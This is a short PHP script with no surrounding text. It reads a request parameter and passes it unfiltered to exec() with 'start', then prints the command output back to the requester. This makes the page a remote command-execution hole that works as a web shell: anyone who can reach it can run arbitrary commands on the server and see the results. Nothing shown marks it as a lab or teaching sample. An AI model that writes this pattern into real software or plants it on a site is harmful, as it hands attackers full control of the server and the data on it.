<?php
$q = $_REQUEST["q"];

exec("start $q", $t);

foreach($t as $line) {
  echo $line;
}
?>
